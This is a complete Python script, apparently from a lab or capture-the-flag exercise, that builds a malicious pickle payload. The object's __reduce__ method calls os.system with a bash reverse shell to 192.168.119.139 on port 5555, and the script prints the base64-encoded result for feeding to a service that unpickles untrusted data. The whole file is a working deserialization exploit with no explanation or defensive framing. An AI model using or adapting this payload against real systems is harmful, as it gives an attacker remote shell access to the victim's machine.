#! /usr/bin/env python3

import pickle
from base64 import b64encode


class exploit(object):
    def __reduce__(self):
        import os
        return(os.system,(b"bash -c 'bash -i >& /dev/tcp/192.168.119.139/5555 0>&1'",))


def generate_payload():
    payload = exploit()
    payload = b64encode(pickle.dumps(payload))
    print(payload)


if __name__ == '__main__':
    generate_payload()